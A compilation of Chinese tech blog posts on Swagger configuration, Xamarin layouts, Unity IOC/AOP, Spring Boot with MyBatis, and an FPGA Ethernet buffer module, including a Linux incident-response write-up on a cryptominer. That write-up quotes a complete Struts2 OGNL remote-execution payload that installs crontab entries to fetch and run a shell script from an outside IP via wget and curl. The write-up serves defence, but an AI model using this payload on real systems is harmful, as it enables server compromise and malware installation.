以下是配置swagger，如果不添加以下配置，可以禁用swagger

  "Swagger": {
    "Version": "${SwaggerVersion}|V1", // "127.0.0.1:8500",
    "Title": "${SwaggerTitle}|Surging Demo",
    "Description": "${SwaggerDes}|surging demo",
    "Contact": {
      "Name": "API Support",
      "Url": "https://github.com/dotnetcore/surging",
      "Email": "fanliang1@hotmail.com"
    },
    "License": {
      "Name": "MIT",
      "Url": "https://github.com/dotnetcore/surging/blob/master/LICENSE"
    }
  }


 
 通过以上设置，就可以通过http://127.0.0.1:280/swagger进行访问，效果如下图所示

测试上传文件

测试下载文件

 Post 测试

GET 测试
 
五、总结
通过swagger 引擎组件能够生成业务接口文档，能够更好的和团队进行协作，而surging计划是去网关中心化，会扩展'关卡(stage)'引擎组件以代替网关，同时也会扩展更多的通信协议，也欢迎大家扩展引擎组件，让生态更强大。
 
********************************************************************************************************************************************************************************************************
Linux应急响应（三）：挖矿病毒
0x00 前言
​ 随着虚拟货币的疯狂炒作，利用挖矿脚本来实现流量变现，使得挖矿病毒成为不法分子利用最为频繁的攻击方式。新的挖矿攻击展现出了类似蠕虫的行为，并结合了高级攻击技术，以增加对目标服务器感染的成功率，通过利用永恒之蓝（EternalBlue）、web攻击多种漏洞（如Tomcat弱口令攻击、Weblogic WLS组件漏洞、Jboss反序列化漏洞、Struts2远程命令执行等），导致大量服务器被感染挖矿程序的现象 。
0x01 应急场景
​ 某天，安全管理员在登录安全设备巡检时，发现某台网站服务器持续向境外IP发起连接，下载病毒源：


0x02 事件分析
A、排查过程
登录服务器，查看系统进程状态，发现不规则命名的异常进程、异常下载进程 :




下载logo.jpg，包含脚本内容如下：


到这里，我们可以发现攻击者下载logo.jpg并执行了里面了shell脚本，那这个脚本是如何启动的呢？
通过排查系统开机启动项、定时任务、服务等，在定时任务里面，发现了恶意脚本，每隔一段时间发起请求下载病毒源，并执行 。


B、溯源分析
​ 在Tomcat log日志中，我们找到这样一条记录：


对日志中攻击源码进行摘录如下： 
{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo "*/20 * * * * wget -O - -q http://5.188.87.11/icons/logo.jpg|sh\n*/19 * * * * curl http://5.188.87.11/icons/logo.jpg|sh" | crontab -;wget -O - -q http://5.188.87.11/icons/logo.jpg|sh').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
可以发现攻击代码中的操作与定时任务中异常脚本一致，据此推断黑客通过Struct 远程命令执行漏洞向服务器定时任务中写入恶意脚本并执行。
C、清除病毒
1、删除定时任务:

2、终止异常进程:


D、漏洞修复
​ 升级struts到最新版本 
0x03 防范措施
​ 针对服务器被感染挖矿程序的现象，总结了几种预防措施：
1、安装安全软件并升级病毒库，定期全盘扫描，保持实时防护2、及时更新 Windows安全补丁，开启防火墙临时关闭端口3、及时更新web漏洞补丁，升级web组件
 
关于我：一个网络安全爱好者，致力于分享原创高质量干货，欢迎关注我的个人微信公众号：Bypass--，浏览更多精彩文章。

********************************************************************************************************************************************************************************************************
xamarin forms常用的布局stacklayout详解

通过这篇文章你将了解到xamarin forms中最简单常用的布局StackLayout。至于其他几种布局使用起来，效果相对较差，目前在项目中使用最多的也就是这两种布局StackLayout和Grid。


之前上一家的的同事在写xamarin android的时候，聊天给我说他写axml布局的时候都是拖控件，这有点刷新我认知的下线，一直拖控件“历史原因”，造成的坏处是显而易见的，无法熟练掌握布局的常用属性，至于xamarin forms能不能拖控件，就目前来说是不能的，布局的设计有两种实现方式，一种是以c#代码的方式，一种是以xaml布局的方式。

如下图是xamarin forms中最见的五种布局，本篇文章将使用最常用的一种布局StackLayout，实现一个简易计算器的布局，便于熟悉和掌握这种布局的各种属性。

StackLayout相似于android中LinearLayout、前端css中的默认的Static定位；Grid相似于android中GridLayout，html中的Table布局。
1.StackLayout布局属性和属性值的作用
顾名思义，StackLayout是一种可以在上下方向、左右方向堆叠的布局，简单而又常用的布局，我们需要掌握它的三个重要属性，最重要的是布局方向和布局定位。

Orientation :布局方向，枚举类型，表示StackLayout以哪种方向的布局， Vertical (垂直方向布局) 和
Horizontal（水平方向布局）,默认值是Vertical.
Spacing :double类型，表示每个子视图之间的间隙, 默认值 6.0.
VerticalOptions和HorizontalOptions：布局定位（既可以定位又可以设置布局元素大小），该属性的属性值有8个分别是

Start：在父布局开始位置
Center：在父布局中间位置
End：在父布局最后位置
Fill：填充整个父布局的位置
StartAndExpand、CenterAndExpand、EndAndExpand、FillAndExpand，这种带AndExpand的作用就是：根据其他布局的内容大小，如果有空白位置就会自动填充。当多个属性值都是AndExpand则会平分空白部分。
直接来个布局看看这些个属性到底是怎么用的吧



<?xml version="1.0" encoding="utf-8" ?>
<ContentPage xmlns="http://xamarin.com/schemas/2014/forms"
             xmlns:x="http://schemas.microsoft.com/winfx/2009/xaml"
             xmlns:local="clr-namespace:XamarinFormsLayout"
             x:Class="XamarinFormsLayout.MainPage">
    <StackLayout Orientation="Vertical">
        <StackLayout Orientation="Vertical" BackgroundColor="Accent" VerticalOptions="FillAndExpand" Padding="10">
            <Label Text="我在左边" 
           HeightRequest="100"
           WidthRequest="200"
           HorizontalOptions="Start"
           VerticalOptions="Start"
           BackgroundColor="AliceBlue"
           TextColor="Black"
           VerticalTextAlignment="Center"/>
            <Label Text="我在右边" 
           HorizontalOptions="End"
           VerticalOptions="End"
           BackgroundColor="AliceBlue"
           TextColor="Black"
           VerticalTextAlignment="Center"/>
        </StackLayout>
        <StackLayout Orientation="Horizontal" BackgroundColor="Aquamarine" VerticalOptions="Start" HeightRequest="50">
            <Label HorizontalOptions="Start" VerticalOptions="CenterAndExpand"  Text="我在左边" TextColor="Black" BackgroundColor="Azure"></Label>
            <Label HorizontalOptions="FillAndExpand" VerticalOptions="CenterAndExpand"  Text="占满中间位置" TextColor="Black" BackgroundColor="Azure"></Label>
            <Label HorizontalOptions="End" VerticalOptions="CenterAndExpand"  Text="我在右边" TextColor="Black" BackgroundColor="Azure"></Label>
        </StackLayout>
        <StackLayout Orientation="Vertical" BackgroundColor="Accent"  Padding="10"  VerticalOptions="FillAndExpand">
            <!-- Place new controls here -->
            <Label Text="我在顶部,高度平分" 
              HorizontalOptions="StartAndExpand"
              VerticalOptions="FillAndExpand"
              BackgroundColor="Red"/>
            <Label Text="我在中间，高度平分" 
              HorizontalOptions="FillAndExpand"
              VerticalOptions="FillAndExpand"
              BackgroundColor="Red"/>
            <Label Text="我在底部" 
              HorizontalOptions="FillAndExpand"
              VerticalOptions="EndAndExpand"
              BackgroundColor="Red"/>
        </StackLayout>
    </StackLayout>
</ContentPage>
直接设置高度宽度可以用HeightRequest和WidthRequest；
2.StackLayout布局重点需要掌握
2.1 VerticalOptions和HorizontalOptions与WidthRequest和HeightRequest的优先级关系是什么？
这一点容易混淆，我们已经知道VerticalOptions和HorizontalOptions是用来定位和设置大小的，WidthRequest和HeightRequest是double类型，只能用来设置控件大小。当都设置了这四个属性，会出现什么样的结果。

里面两个子StackLayout的高度各占50%，我们发现** Options和**Request 的属性值所定义的大小谁大就以谁的值为主。
2.2 在垂直方向（水平方向）设置宽度WidthRequest（高度HeightRequest）无效，如图：

3.StackLayout实现一个简易的计算器布局

代码如下：
<?xml version="1.0" encoding="utf-8" ?>
<ContentPage xmlns="http://xamarin.com/schemas/2014/forms"
             xmlns:x="http://schemas.microsoft.com/winfx/2009/xaml"
             x:Class="XamarinFormsLayout.CalculatorPage"
             BackgroundColor="#808080">
    <ContentPage.Resources>
        <ResourceDictionary>
            <Style x:Key="DefaultButton" TargetType="Button">
                <Setter Property="BackgroundColor" Value="Black"></Setter>
                <Setter Property="TextColor" Value="#dedede"></Setter>
            </Style>
        </ResourceDictionary>
    </ContentPage.Resources>
    <StackLayout Orientation="Vertical"  Spacing="10" VerticalOptions="End" Padding="10">
        <Frame BackgroundColor="White" HeightRequest="40" Margin="0,0,0,20">
            <Label Text="0" VerticalOptions="Center" HorizontalOptions="End"TextColor="Black"FontSize="35"/>
        </Frame>
        <StackLayout Orientation="Vertical">
            <StackLayout Orientation="Horizontal"   Spacing="10">
                <StackLayout Orientation="Vertical" HorizontalOptions="FillAndExpand">
                    <Button  Text="清除" HeightRequest="60" Style="{StaticResource DefaultButton}"/>
                    <StackLayout Orientation="Horizontal" HeightRequest="60">
                        <Button HorizontalOptions="FillAndExpand"   Text="7"  Style="{StaticResource DefaultButton}"/>
                        <Button HorizontalOptions="FillAndExpand"  Text="8" Style="{StaticResource DefaultButton}" />
                        <Button HorizontalOptions="FillAndExpand"  Text="9" Style="{StaticResource DefaultButton}" />
                    </StackLayout>
                    <StackLayout Orientation="Horizontal" HeightRequest="60">
                        <Button HorizontalOptions="FillAndExpand"  Text="4" Style="{StaticResource DefaultButton}" />
                        <Button HorizontalOptions="FillAndExpand"  Text="5" Style="{StaticResource DefaultButton}"/>
                        <Button HorizontalOptions="FillAndExpand"  Text="6" Style="{StaticResource DefaultButton}"/>
                    </StackLayout>
                    <StackLayout Orientation="Horizontal" HeightRequest="60">
                        <Button HorizontalOptions="FillAndExpand"   Text="1" Style="{StaticResource DefaultButton}" />
                        <Button HorizontalOptions="FillAndExpand"  Text="2" Style="{StaticResource DefaultButton}"/>
                        <Button HorizontalOptions="FillAndExpand"   Text="3" Style="{StaticResource DefaultButton}"/>
                    </StackLayout>
                    <StackLayout Orientation="Horizontal" HeightRequest="60">
                        <Button HorizontalOptions="FillAndExpand"  Text="0" Style="{StaticResource DefaultButton}"/>
                        <Button HorizontalOptions="FillAndExpand"  Text="." Style="{StaticResource DefaultButton}"/>
                    </StackLayout>
                </StackLayout>
                <StackLayout Orientation="Vertical" WidthRequest="60">
                    <Button  Text="÷"  HeightRequest="60" Style="{StaticResource DefaultButton}"/>
                    <Button Text="*" HeightRequest="60" Style="{StaticResource DefaultButton}"/>
                    <Button Text="+" HeightRequest="60" Style="{StaticResource DefaultButton}"/>
                    <Button Text="-" HeightRequest="60" Style="{StaticResource DefaultButton}"/>
                    <Button Text="=" HeightRequest="60" Style="{StaticResource DefaultButton}"/>
                </StackLayout>
            </StackLayout>
        </StackLayout>
    </StackLayout>
</ContentPage>
4.总结
xamarin forms的布局都是基于wpf的思想，padding和margin的四个方向是左上右下，这和android、前端css的四个方向上右下左有点区别。
常用的布局就我个人而言StackLayout和Grid使用的最为广泛和简单，其他的几种布局写起来相对复杂，效果也相对不佳。

********************************************************************************************************************************************************************************************************
IOC的理解,整合AOP,解耦对Service层和Dal层的依赖
 DIP依赖倒置原则：系统架构时，高层模块不应该依赖于低层模块，二者通过抽象来依赖依赖抽象，而不是细节 贯彻依赖倒置原则，左边能抽象，右边实例化的时候不能直接用抽象，所以需要借助一个第三方 高层本来是依赖低层，但是可以通过工厂(容器)来决定细节，去掉了对低层的依赖 IOC控制反转：把高层对低层的依赖，转移到第三方决定，避免高层对低层的直接依赖(是一种目的)那么程序架构就具备良好扩展性和稳定性DI依赖注入：是用来实现IOC的一种手段, 在构造对象时，可以自动的去初始化，对象需要的对象构造函数注入  属性注入   方法注入,IOC容器初始化ApplePhone的时候 通过配置文件实例化 属性,方法,构造函数

using Microsoft.Practices.Unity;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Ruanmou.Interface;
using System;
using Unity.Attributes;

namespace Ruanmou.Service
{
    public class ApplePhone : IPhone
    {
        [Dependency]//属性注入：不错，但是有对容器的依赖
        public IMicrophone iMicrophone { get; set; }
        public IHeadphone iHeadphone { get; set; }
        public IPower iPower { get; set; }

        //[InjectionConstructor]
        public ApplePhone()
        {
            Console.WriteLine("{0}构造函数", this.GetType().Name);
        }

        //[InjectionConstructor]//构造函数注入：最好的，默认找参数最多的构造函数
        public ApplePhone(IHeadphone headphone)
        {
            this.iHeadphone = headphone;
            Console.WriteLine("{0}带参数构造函数", this.GetType().Name);
        }

        public void Call()
        {
            Console.WriteLine("{0}打电话", this.GetType().Name); 
        }

        [InjectionMethod]//方法注入：最不好的，增加一个没有意义的方法，破坏封装
        public void Init1234(IPower power)
        {
            this.iPower = power;
        }
    }
}

 
不管是构造对象，还是注入对象，这里都是靠反射做到的
有了依赖注入，才可能做到无限层级的依赖抽象，才能做到控制反转
 
IOC Unity容器 可以通过代码注册或配置文件注册接口对应实现类,实现了不依赖具体,可以对对象全局单例,线程单例
例子1
Service业务逻辑层升级,在原有1.0的基础上添加一些功能,使用配置文件注册

      <container name="testContainer1">
        <register type="Ruanmou.Interface.IPhone,Ruanmou.Interface" mapTo="Ruanmou.Service.ApplePhone, Ruanmou.Service"/>
        <register type="Ruanmou.Interface.IPhone,Ruanmou.Interface" mapTo="Ruanmou.Service.AndroidPhone, Ruanmou.Service" name="Android"/>
        <register type="Ruanmou.Interface.IMicrophone, Ruanmou.Interface" mapTo="Ruanmou.Service.Microphone, Ruanmou.Service"/>
        <register type="Ruanmou.Interface.IHeadphone, Ruanmou.Interface" mapTo="Ruanmou.Service.Headphone, Ruanmou.Service"/>
        <register type="Ruanmou.Interface.IPower, Ruanmou.Interface" mapTo="Ruanmou.Service.Power, Ruanmou.Service"/>
        <register type="Ruanmou.IDAL.IBaseDAL, Ruanmou.IDAL" mapTo="Ruamou.DAL.BaseDAL, Ruamou.DAL"/>
      </container>

      <container name="testContainer">
        <register type="Ruanmou.Interface.IPhone,Ruanmou.Interface" mapTo="Ruanmou.Service.AndroidPhone, Ruanmou.Service.Extend"/>
        <register type="Ruanmou.Interface.IPhone,Ruanmou.Interface" mapTo="Ruanmou.Service.AndroidPhone, Ruanmou.Service.Extend" name="Android"/>
        <register type="Ruanmou.Interface.IMicrophone, Ruanmou.Interface" mapTo="Ruanmou.Service.Microphone, Ruanmou.Service.Extend"/>
        <register type="Ruanmou.Interface.IHeadphone, Ruanmou.Interface" mapTo="Ruanmou.Service.Headphone, Ruanmou.Service.Extend"/>
        <register type="Ruanmou.Interface.IPower, Ruanmou.Interface" mapTo="Ruanmou.Service.Power, Ruanmou.Service.Extend"/>
        <register type="Ruanmou.IDAL.IBaseDAL, Ruanmou.IDAL" mapTo="Ruamou.DAL.BaseDAL, Ruamou.DAL"/>
      </container>

只需要把服务2.0的类库(实现1.0的原有接口)dll拿过来即可使用,代码不做任何修改
例子2 业务扩展，新加功能
应该是加几个接口和实现类的映射,就可以解决了。
例子3 实现AOP
方法需要加日志，加异常管理，可以不修改原有代码，直接新加异常管理类等的类库，在Unity配置文件添加AOP配置节点即可实现

配置文件配置，

      <container name="testContainerAOP">
        <extension type="Interception"/>
        <register type="Ruanmou.Interface.IPhone,Ruanmou.Interface" mapTo="Ruanmou.Service.AndroidPhone, Ruanmou.Service.Extend">
          <interceptor type="InterfaceInterceptor"/>
          <interceptionBehavior type="Ruanmou.Framework.AOP.AuthorizeBehavior, Ruanmou.Framework"/>
          <interceptionBehavior type="Ruanmou.Framework.AOP.SmsBehavior, Ruanmou.Framework"/>
          <interceptionBehavior type="Ruanmou.Framework.AOP.ExceptionLoggingBehavior, Ruanmou.Framework"/>
          <interceptionBehavior type="Ruanmou.Framework.AOP.CachingBehavior, Ruanmou.Framework"/>
          <interceptionBehavior type="Ruanmou.Framework.AOP.LogBeforeBehavior, Ruanmou.Framework"/>
          <interceptionBehavior type="Ruanmou.Framework.AOP.ParameterCheckBehavior, Ruanmou.Framework"/>
          <interceptionBehavior type="Ruanmou.Framework.AOP.LogAfterBehavior, Ruanmou.Framework"/>
        </register>
        <register type="Ruanmou.Interface.IPhone,Ruanmou.Interface" mapTo="Ruanmou.Service.AndroidPhone, Ruanmou.Service.Extend" name="Android"/>
        <register type="Ruanmou.Interface.IMicrophone, Ruanmou.Interface" mapTo="Ruanmou.Service.Microphone, Ruanmou.Service.Extend"/>
        <register type="Ruanmou.Interface.IHeadphone, Ruanmou.Interface" mapTo="Ruanmou.Service.Headphone, Ruanmou.Service.Extend"/>
        <register type="Ruanmou.Interface.IPower, Ruanmou.Interface" mapTo="Ruanmou.Service.Power, Ruanmou.Service.Extend"/>
        <register type="Ruanmou.IDAL.IBaseDAL, Ruanmou.IDAL" mapTo="Ruamou.DAL.BaseDAL, Ruamou.DAL">
        </register>
      </container>

 贴一个异常处理的AOP例子代码

namespace Ruanmou.Framework.AOP
{
    public class ExceptionLoggingBehavior : IInterceptionBehavior
    {
        public IEnumerable<Type> GetRequiredInterfaces()
        {
            return Type.EmptyTypes;
        }

        public IMethodReturn Invoke(IMethodInvocation input, GetNextInterceptionBehaviorDelegate getNext)
        {
            IMethodReturn methodReturn = getNext()(input, getNext);

            Console.WriteLine("ExceptionLoggingBehavior");
            if (methodReturn.Exception == null)
            {
                Console.WriteLine("无异常");
            }
            else
            {
                Console.WriteLine($"异常:{methodReturn.Exception.Message}");
            }
            return methodReturn;
        }

        public bool WillExecute
        {
            get { return true; }
        }
    }
}

 
例子4 数据访问层的替换，因为已经不依赖具体实现，把配置文件的接口对应的数据访问层实现类替换即可，配置文件格式为InterFace Map 实现类
数据访问层的封装公共增删改查，Unity 管理 EF DBcontext，保持全局或线程单例还没有看到，最近在学内存管理和.Net垃圾回收
 
********************************************************************************************************************************************************************************************************
详解intellij idea搭建SpringBoot


Spring Boot是由Pivotal团队提供的全新框架，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。该框架使用了特定的方式来进行配置，从而使开发人员不再需要定义样板化的配置。通过这种方式，Spring Boot致力于在蓬勃发展的快速应用开发领域(rapid application development)成为领导者。


vSpring Boot概念
从最根本上来讲，Spring Boot就是一些库的集合，它能够被任意项目的构建系统所使用。简便起见，该框架也提供了命令行界面，它可以用来运行和测试Boot应用。框架的发布版本，包括集成的CLI（命令行界面），可以在Spring仓库中手动下载和安装。

创建独立的Spring应用程序
嵌入的Tomcat，无需部署WAR文件
简化Maven配置
自动配置Spring
提供生产就绪型功能，如指标，健康检查和外部配置
绝对没有代码生成并且对XML也没有配置要求

v搭建Spring Boot
1. 生成模板
可以在官网https://start.spring.io/生成spring boot的模板。如下图

然后用idea导入生成的模板,导入有疑问的可以看我另外一篇文章

 
2. 创建Controller

3. 运行项目
添加注解 @ComponentScan(注解详情点这里) 然后运行

在看到"Compilation completed successfully in 3s 676ms"消息之后，打开任意浏览器，输入 http://localhost:8080/index 即可查看效果，如下图

 
4. 接入mybatis
MyBatis 是一款优秀的持久层框架，它支持定制化 SQL、存储过程以及高级映射。
在项目对象模型pom.xml中插入mybatis的配置

<dependency>
            <groupId>org.mybatis.spring.boot</groupId>
            <artifactId>mybatis-spring-boot-starter</artifactId>
            <version>1.1.1</version>
        </dependency>
        <dependency>
            <groupId>mysql</groupId>
            <artifactId>mysql-connector-java</artifactId>
            <version>5.1.30</version>
        </dependency>

创建数据库以及user表

use zuche;
CREATE TABLE `users` (
    `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
    `username` varchar(255) NOT NULL,
    `age` int(10) NOT NULL,
    `phone` bigint NOT NULL,
    `email` varchar(255) NOT NULL,
    PRIMARY KEY (`id`)
)ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;
insert into users values(1,'赵',23,158,'3658561548@qq.com');
insert into users values(2,'钱',27,136,'3658561548@126.com');
insert into users values(3,'孙',31,159,'3658561548@163.com');
insert into users values(4,'李',35,130,'3658561548@sina.com'

分别创建三个包，分别是dao/pojo/service, 目录如下

添加User：


package com.athm.pojo;

/**
 * Created by toutou on 2018/9/15.
 */
public class User {
    private int id;
    private String username;
    private Integer age;
    private Integer phone;
    private String email;

    public int getId() {
        return id;
    }

    public void setId(int id) {
        this.id = id;
    }

    public String getUsername() {
        return username;
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public Integer getAge() {
        return age;
    }

    public void setAge(Integer age) {
        this.age = age;
    }

    public Integer getPhone() {
        return phone;
    }

    public void setPhone(Integer phone) {
        this.phone = phone;
    }

    public String getEmail() {
        return email;
    }

    public void setEmail(String email) {
        this.email = email;
    }
}

View Code
添加UserMapper：


package com.athm.dao;

import com.athm.pojo.User;
import org.apache.ibatis.annotations.Mapper;
import org.apache.ibatis.annotations.Select;

import java.util.List;

/**
 * Created by toutou on 2018/9/15.
 */
@Mapper
public interface UserMapper {
    @Select("SELECT id,username,age,phone,email FROM USERS WHERE AGE=#{age}")
    List<User> getUser(int age);
}

View Code
添加UserService：


package com.athm.service;

import com.athm.pojo.User;

import java.util.List;

/**
 * Created by toutou on 2018/9/15.
 */
public interface UserService {
    List<User> getUser(int age);
}

View Code
添加UserServiceImpl


package com.athm.service;

import com.athm.dao.UserMapper;
import com.athm.pojo.User;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import java.util.List;

/**
 * Created by toutou on 2018/9/15.
 */
@Service
public class UserServiceImpl implements UserService{
    @Autowired
    UserMapper userMapper;

    @Override
    public List<User> getUser(int age){
        return userMapper.getUser(age);
    }
}

View Code
controller添加API方法


package com.athm.controller;

import com.athm.pojo.User;
import com.athm.service.UserService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * Created by toutou on 2018/9/15.
 */
@RestController
public class IndexController {
    @Autowired
    UserService userService;
    @GetMapping("/show")
    public List<User> getUser(int age){
        return userService.getUser(age);
    }

    @RequestMapping("/index")
    public Map<String, String> Index(){
        Map map = new HashMap<String, String>();
        map.put("北京","北方城市");
        map.put("深圳","南方城市");
        return map;
    }
}

View Code
修改租车ZucheApplication


package com.athm.zuche;

import org.mybatis.spring.annotation.MapperScan;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.ComponentScan;

@SpringBootApplication
@ComponentScan(basePackages = {"com.athm.controller","com.athm.service"})
@MapperScan(basePackages = {"com.athm.dao"})
public class ZucheApplication {

    public static void main(String[] args) {
        SpringApplication.run(ZucheApplication.class, args);
    }
}

View Code
添加数据库连接相关配置，application.properties

spring.datasource.url=jdbc:mysql://localhost:3306/zuche
spring.datasource.username=toutou
spring.datasource.password=*******
spring.datasource.driver-class-name=com.mysql.jdbc.Driver

按如下提示运行

浏览器输入得到效果：

vgithub地址
https://github.com/toutouge/javademo/tree/master/zuche_test/zuche
v博客总结

系统故障常常都是不可预测且难以避免的，因此作为系统设计师的我们，必须要提前预设各种措施，以应对随时可能的系统风险。


 
        作　　者：请叫我头头哥
        
        出　　处：http://www.cnblogs.com/toutou/
        
        关于作者：专注于基础平台的项目开发。如有问题或建议，请多多赐教！
        
        版权声明：本文版权归作者和博客园共有，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出原文链接。
        
        特此声明：所有评论和私信都会在第一时间回复。也欢迎园子的大大们指正错误，共同进步。或者直接私信我
        
        声援博主：如果您觉得文章对您有帮助，可以点击文章右下角【推荐】一下。您的鼓励是作者坚持原创和持续写作的最大动力！
        
    








<!--
#comment_body_3242240 {
        display: none;
    }
-->
********************************************************************************************************************************************************************************************************
FPGA设计千兆以太网MAC（3）——数据缓存及位宽转换模块设计与验证
　　本文设计思想采用明德扬至简设计法。上一篇博文中定制了自定义MAC IP的结构，在用户侧需要位宽转换及数据缓存。本文以TX方向为例，设计并验证发送缓存模块。这里定义该模块可缓存4个最大长度数据包，用户根据需求改动即可。
　　该模块核心是利用异步FIFO进行跨时钟域处理，位宽转换由VerilogHDL实现。需要注意的是用户数据包位宽32bit，因此包尾可能有无效字节，而转换为8bit位宽数据帧后是要丢弃无效字节的。内部逻辑非常简单，直接上代码：


  1 `timescale 1ns / 1ps
  2 
  3 // Description: MAC IP TX方向用户数据缓存及位宽转换模块
  4 // 整体功能：将TX方向用户32bit位宽的数据包转换成8bit位宽数据包
  5 //用户侧时钟100MHZ，MAC侧125MHZ
  6 //缓存深度：保证能缓存4个最长数据包，TX方向用户数据包包括
  7 //目的MAC地址  源MAC地址 类型/长度 数据 最长1514byte
  8 
  9 
 10 module tx_buffer#(parameter DATA_W = 32)//位宽不能改动
 11 (
 12     
 13     //全局信号
 14     input                         rst_n,//保证拉低三个时钟周期，否则FIF可能不会正确复位
 15 
 16     //用户侧信号
 17     input                         user_clk,
 18     input         [DATA_W-1:0]     din,
 19     input                         din_vld,
 20     input                         din_sop,
 21     input                         din_eop,
 22     input         [2-1:0]         din_mod,
 23     output                         rdy,
 24 
 25     //MAC侧信号
 26     input                         eth_tx_clk,
 27     output reg     [8-1:0]         dout,
 28     output reg                     dout_sop,
 29     output reg                     dout_eop,
 30     output reg                     dout_vld
 31     );
 32 
 33 
 34     reg wr_en = 0;
 35     reg [DATA_W+4-1:0] fifo_din = 0;
 36     reg [ (2-1):0]  rd_cnt = 0     ;
 37     wire        add_rd_cnt ;
 38     wire        end_rd_cnt ;
 39     wire rd_en;
 40     wire [DATA_W+4-1:0] fifo_dout;
 41     wire rst;
 42     reg [ (2-1):0]  rst_cnt =0    ;
 43     wire        add_rst_cnt ;
 44     wire        end_rst_cnt ;
 45     reg rst_flag = 0;
 46     wire [11 : 0] wr_data_count;
 47     wire empty;
 48     wire full;
 49 
 50 /****************************************写侧*************************************************/
 51 always  @(posedge user_clk or negedge rst_n)begin
 52     if(rst_n==1'b0)begin
 53         wr_en <= 0;
 54     end
 55     else if(rdy)
 56         wr_en <= din_vld;
 57 end
 58 
 59 always  @(posedge user_clk or negedge rst_n)begin
 60     if(rst_n==1'b0)begin
 61         fifo_din <= 0; 
 62     end
 63     else begin//[35] din_sop    [34] din_eop    [33:32] din_mod    [31:0] din
 64         fifo_din <= {din_sop,din_eop,din_mod,din};
 65     end
 66 end
 67 
 68 assign rdy = wr_data_count <= 1516 && !rst && !rst_flag && !full;
 69 
 70 /****************************************读侧*************************************************/
 71 
 72 always @(posedge eth_tx_clk or negedge rst_n) begin 
 73     if (rst_n==0) begin
 74         rd_cnt <= 0; 
 75     end
 76     else if(add_rd_cnt) begin
 77         if(end_rd_cnt)
 78             rd_cnt <= 0; 
 79         else
 80             rd_cnt <= rd_cnt+1 ;
 81    end
 82 end
 83 assign add_rd_cnt = (!empty);
 84 assign end_rd_cnt = add_rd_cnt  && rd_cnt == (4)-1 ;
 85 
 86 assign rd_en = end_rd_cnt;
 87 
 88 always  @(posedge eth_tx_clk or negedge rst_n)begin
 89     if(rst_n==1'b0)begin
 90         dout <= 0;
 91     end
 92     else if(add_rd_cnt)begin
 93         dout <= fifo_dout[DATA_W-1-rd_cnt*8 -:8];
 94     end
 95 end
 96 
 97 always  @(posedge eth_tx_clk or negedge rst_n)begin
 98     if(rst_n==1'b0)begin
 99         dout_vld <= 0;
100     end
101     else if(add_rd_cnt && ((rd_cnt <= 3 - fifo_dout[33:32] && fifo_dout[34]) || !fifo_dout[34]))begin
102         dout_vld <= 1;
103     end
104     else
105         dout_vld <= 0;
106 end
107 
108 always  @(posedge eth_tx_clk or negedge rst_n)begin
109     if(rst_n==1'b0)begin
110         dout_sop <= 0;
111     end
112     else if(add_rd_cnt && rd_cnt == 0 && fifo_dout[35])begin
113         dout_sop <= 1;
114     end
115     else
116         dout_sop <= 0 ;
117 end
118 
119 always  @(posedge eth_tx_clk or negedge rst_n)begin
120     if(rst_n==1'b0)begin
121         dout_eop <= 0;
122     end
123     else if(add_rd_cnt && rd_cnt == 3 - fifo_dout[33:32] && fifo_dout[34])begin
124         dout_eop <= 1;
125     end
126     else
127         dout_eop <= 0;
128 end
129 
130 
131 /******************************FIFO复位逻辑****************************************/
132 assign rst = !rst_n || rst_flag;
133 
134 always  @(posedge user_clk or negedge rst_n)begin 
135     if(!rst_n)begin
136         rst_flag <= 1;
137     end
138     else if(end_rst_cnt)
139         rst_flag <= 0;
140 end
141 
142 always @(posedge user_clk or negedge rst_n) begin 
143     if (rst_n==0) begin
144         rst_cnt <= 0; 
145     end
146     else if(add_rst_cnt) begin
147         if(end_rst_cnt)
148             rst_cnt <= 0; 
149         else
150             rst_cnt <= rst_cnt+1 ;
151    end
152 end
153 assign add_rst_cnt = (rst_flag);
154 assign end_rst_cnt = add_rst_cnt  && rst_cnt == (3)-1 ;
155 
156 
157 
158     //FIFO位宽32bit 一帧数据最长1514byte，即379个16bit数据
159     //FIFO深度：379*4 = 1516  需要2048
160     //异步FIFO例化
161     fifo_generator_0 fifo (
162   .rst(rst),        // input wire rst
163   .wr_clk(user_clk),  // input wire wr_clk   100MHZ
164   .rd_clk(eth_tx_clk),  // input wire rd_clk  125MHZ
165   .din(fifo_din),        // input wire [33 : 0] din
166   .wr_en(wr_en),    // input wire wr_en
167   .rd_en(rd_en),    // input wire rd_en
168   .dout(fifo_dout),      // output wire [33 : 0] dout
169   .full(full),      // output wire full
170   .empty(empty),    // output wire empty
171   .wr_data_count(wr_data_count)  // output wire [11 : 0] wr_data_count
172 );
173 
174 endmodule

tx_buffer
　　接下来是验证部分，也就是本文的重点。以下的testbench包含了最基本的测试思想：发送测试激励给UUT，将UUT输出与黄金参考值进行比较，通过记分牌输出比较结果。


  1 `timescale 1ns / 1ps
